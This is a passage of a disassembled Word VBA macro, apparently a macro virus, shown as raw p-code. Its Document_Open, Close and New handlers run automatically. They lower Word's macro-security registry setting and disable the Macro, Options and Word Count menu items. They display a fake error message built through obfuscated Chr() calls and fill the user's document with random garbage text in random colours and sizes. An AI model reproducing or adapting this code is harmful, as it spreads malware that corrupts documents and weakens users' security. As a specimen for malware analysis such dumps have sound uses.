' 	LitStr 0x002B "echo All System Checks have been completed."
' 	PrintItemNL 
' Line #79:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #80:
' 	EndSub 
' Line #81:
' Line #82:
' Line #83:
' 	FuncDefn (Private Sub nd())
' Line #84:
' 	ArgsCall Randomize 0x0000 
' Line #85:
' 	LitDI2 0x0055 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0055 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St _B_var_Chr$ 
' Line #86:
' 	LitStr 0x0003 "{00"
' 	Ld Rnd 
' 	LitDI4 0x423F 0x000F 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld Rnd 
' 	LitDI4 0x869F 0x0001 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	LitStr 0x0001 "}"
' 	Concat 
' 	St _B_var_t 
' Line #87:
' 	Ld _B_var_Chr$ 
' 	Ld _B_var_t 
' 	Concat 
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' Line #88:
' 	EndSub 
' Line #89:
' Line #90:
' 	FuncDefn (Private Sub Document_Close())
' Line #91:
' 	ArgsCall Document_Open 0x0000 
' Line #92:
' 	ArgsCall MacroContainer 0x0000 
' Line #93:
' 	EndSub 
' Line #94:
' Line #95:
' 	FuncDefn (Private Sub Document_New())
' Line #96:
' 	ArgsCall Document_Open 0x0000 
' Line #97:
' 	EndSub 
' Line #98:
' Line #99:
' 	FuncDefn (Private Sub Document_Open())
' Line #100:
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	Ld ActivePrinter 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo F 
' 	EndIf 
' Line #101:
' 	LitStr 0x001E "Undefined/Unexpected error on "
' 	Ld ActivePrinter 
' 	Add 
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' Line #102:
' 	Label F 
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0064 
' 	LitDI2 0x0063 
' 	Sub 
' 	Paren 
' 	MemStWith PrintHiddenText 
' 	BoS 0x0000 
' 	LitDI2 0x0063 
' 	LitDI2 0x0063 
' 	Sub 
' 	Paren 
' 	MemStWith Word2000 
' 	BoS 0x0000 
' 	LitDI2 0x0063 
' 	LitDI2 0x0063 
' 	Sub 
' 	Paren 
' 	MemStWith SavePropertiesPrompt 
' Line #103:
' 	LitDI2 0x0063 
' 	LitDI2 0x0063 
' 	Sub 
' 	Paren 
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0063 
' 	LitDI2 0x0063 
' 	Sub 
' 	Paren 
' 	MemStWith twith 
' 	BoS 0x0000 
' 	EndWith 
' Line #104:
' 	LitDI2 0x0063 
' 	LitDI2 0x0063 
' 	Sub 
' 	Paren 
' 	Ld ActiveWindow 
' 	MemLd View 
' 	MemSt ShowHiddenText 
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn DocWords
' 	VarDefn DocHalfWords
' 	VarDefn DocLastWords
' Line #105:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #106:
' 	LitDI2 0x0063 
' 	LitDI2 0x0063 
' 	Sub 
' 	Paren 
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitDI2 0x0063 
' 	LitDI2 0x0063 
' 	Sub 
' 	Paren 
' 	LitStr 0x000D "Print Preview"
' 	LitStr 0x0004 "File"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitDI2 0x0063 
' 	LitDI2 0x0063 
' 	Sub 
' 	Paren 
' 	LitStr 0x000A "Select All"
' 	LitStr 0x0004 "Edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #107:
' 	LitDI2 0x0063 
' 	LitDI2 0x0063 
' 	Sub 
' 	Paren 
' 	LitStr 0x001B "Undo VBA-Selection.TypeText"
' 	LitStr 0x0004 "Edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitDI2 0x0063 
' 	LitDI2 0x0063 
' 	Sub 
' 	Paren 
' 	LitStr 0x000D "Word Count..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitDI2 0x0063 
' 	LitDI2 0x0063 
' 	Sub 
' 	Paren 
' 	LitStr 0x000A "Options..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #108:
' 	LitDI2 0x0063 
' 	LitDI2 0x0063 
' 	Sub 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd ActiveWindow 
' 	MemLd View 
' 	MemSt ShowFirstLineOnly 
' 	BoS 0x0000 
' 	Ld ActiveDocument 
' 	MemLd Words 
' 	MemLd Count 
' 	St DocWords 
' 	BoS 0x0000 
' 	Ld DocWords 
' 	LitDI2 0x0002 
' 	Div 
' 	FnInt 
' 	St DocHalfWords 
' 	BoS 0x0000 
' 	LitDI2 0x0064 
' 	LitDI2 0x0063 
' 	Sub 
' 	Paren 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Hidden 
' 	BoS 0x0000 
' 	LitStr 0x001E "   {Printer Error #0099544}   "
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #109:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	Set Gargle 
' 	BoS 0x0000 
' 	StartWithExpr 
' 	Ld Gargle 
' 	With 
' 	BoS 0x0000 
' 	Ld wdCharacter 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	UMi 
' 	ParamNamed Count 
' 	ArgsMemCallWith MoveStart 0x0002 
' 	BoS 0x0000 
' 	ArgsMemCallWith Select 0x0000 
' 	BoS 0x0000 
' 	EndWith 
' Line #110:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' 	BoS 0x0000 
' 	Ld s 
' 	LitDI2 0x0001 
' 	Sub 
' 	St s 
' 	BoS 0x0000 
' 	Ld s 
' 	LitDI2 0x0001 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0014 
' 	St s 
' 	EndIf 
' Line #111:
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St a$ 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St B$ 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c$ 
' Line #112:
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d$ 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St e$ 
' 	BoS 0x0000 
' 	Ld a$ 
' 	Ld B$ 
' 	Add 
' 	Ld c$ 
' 	Add 
' 	Ld d$ 
' 	Add 
' 	Ld e$ 
' 	Add 
' 	St F$ 
' Line #113:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	St redx 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	St bluex 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	St greenx 
' Line #114:
' 	LitDI2 0x0064 
' 	LitDI2 0x0063 
' 	Sub 
' 	Paren 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Hidden 
' 	BoS 0x0000 
' 	Ld s 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' 	BoS 0x0000 
' 	Ld redx 
' 	Ld greenx 
' 	Ld bluex 
' 	ArgsLd RGB 0x0003 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Color 
' 	BoS 0x0000 
' 	Ld F$ 
' 	Paren 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #115:
' 	LitDI2 0x0015 
' 	St s 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld DocHalfWords 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	Set Gargle 
' 	BoS 0x0000 
' 	StartWithExpr 
' 	Ld Gargle 
' 	With 
' 	BoS 0x0000 
' 	Ld wdCharacter 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	UMi 
' 	ParamNamed Count 
' 	ArgsMemCallWith MoveStart 0x0002 
' 	BoS 0x0000 
' 	ArgsMemCallWith Select 0x0000 
' 	BoS 0x0000 
' 	EndWith 
' Line #116:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' 	BoS 0x0000 
' 	Ld s 
' 	LitDI2 0x0001 
' 	Sub 
' 	St s 
' 	BoS 0x0000 
' 	Ld s 
' 	LitDI2 0x0001 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0014 
' 	St s 
' 	EndIf 
' Line #117:
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St a$ 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St B$ 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c$ 
' Line #118:
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d$ 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St e$ 
' 	BoS 0x0000 
' 	Ld a$ 
' 	Ld B$ 
' 	Add 
' 	Ld c$ 
' 	Add 
' 	Ld d$ 
' 	Add 
' 	Ld e$ 
' 	Add 
' 	St F$ 
' Line #119:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	St redx 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	St bluex 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	St greenx 
' Line #120:
' 	LitDI2 0x0064 
' 	LitDI2 0x0063 
' 	Sub 
' 	Paren 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Hidden 
' 	BoS 0x0000 
' 	Ld s 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' 	BoS 0x0000 
' 	Ld redx 
' 	Ld greenx 
' 	Ld bluex 
' 	ArgsLd RGB 0x0003 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Color 
' 	BoS 0x0000 
' 	Ld F$ 
' 	Paren 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' Line #121:
' 	LitDI2 0x0015 
' 	St s 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' 	BoS 0x0000 
' 	Ld s 
' 	LitDI2 0x0001 
' 	Sub 
' 	St s 
' 	BoS 0x0000 
